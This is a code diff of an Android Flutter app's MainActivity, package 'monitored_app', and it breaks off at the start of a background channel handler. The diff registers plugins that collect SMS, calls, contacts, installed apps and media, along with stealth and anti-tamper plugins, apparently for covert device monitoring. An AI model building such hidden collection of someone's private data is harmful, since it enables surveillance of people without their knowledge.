@@ -1,22 +1,38 @@
 package com.xpsafeconnect.monitored_app
 
+import android.content.Intent
+import android.os.Bundle
 import io.flutter.embedding.android.FlutterActivity
 import io.flutter.embedding.engine.FlutterEngine
+import io.flutter.plugin.common.MethodChannel
 
 class MainActivity: FlutterActivity() {
+    companion object {
+        private const val BACKGROUND_CHANNEL = "com.xpsafeconnect.monitored_app/background"
+    }
+
     override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
         super.configureFlutterEngine(flutterEngine)
         
         // Initialize unlock method channel
         UnlockMethodChannel(context).configureChannel(flutterEngine)
 
-        flutterEngine.plugins.add(UnlockDevicePlugin())
+        // Register plugins
         flutterEngine.plugins.add(UnlockDevicePlugin())
         flutterEngine.plugins.add(SmsCollectorPlugin())
         flutterEngine.plugins.add(CallsCollectorPlugin())
         flutterEngine.plugins.add(AppsCollectorPlugin())
         flutterEngine.plugins.add(MediaCapturePlugin())
+        flutterEngine.plugins.add(MediaStoreScannerPlugin())
         flutterEngine.plugins.add(BatteryOptimizationPlugin())
+        flutterEngine.plugins.add(SecurityPlugin())
+        flutterEngine.plugins.add(KeystorePlugin())
+        flutterEngine.plugins.add(PerformancePlugin())
+        flutterEngine.plugins.add(BatteryMonitorPlugin())
+        flutterEngine.plugins.add(PermissionsPlugin())
+        flutterEngine.plugins.add(StealthPlugin())
+        flutterEngine.plugins.add(AntiTamperPlugin())
+        flutterEngine.plugins.add(ContactsPlugin())
 
         // Configure background service channel
         MethodChannel(flutterEngine.dartExecutor.binaryMessenger, BACKGROUND_CHANNEL).setMethodCallHandler { call, result ->
